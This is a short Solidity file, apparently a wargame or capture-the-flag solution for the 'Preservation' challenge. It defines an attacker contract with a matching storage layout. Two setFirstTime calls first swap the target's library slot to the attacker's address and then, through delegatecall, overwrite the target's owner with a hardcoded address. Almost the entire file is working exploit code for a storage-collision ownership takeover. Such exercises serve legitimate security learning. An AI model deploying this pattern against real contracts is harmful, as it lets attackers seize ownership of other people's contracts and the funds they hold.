contract attacker {

  address public timeZone1Library;
  address public timeZone2Library;
  address public owner; 
  address public hackerAddress = 0x4B229Ed260cc6AA763c17C412162d46f2b4caF52;

  // 1st modify the timeZone1Library with our attacker contract address.
  function attack(Preservation _preservation) public {
    _preservation.setFirstTime(uint256(uint160(address(this))));
    _preservation.setFirstTime(uint256(uint160(hackerAddress)));
  }

  // 2nd call a function with the same name but storing the address you want to set as Owner. It will modify the third storage in the contract.
  function setTime(uint _time) public {
    owner = address(uint160(_time));
  }
}

// 1. Modify timeZone1Library address to be our contract address.
// 2. When it is our contract address, then we call delegate call again to modifiy owner´s address.
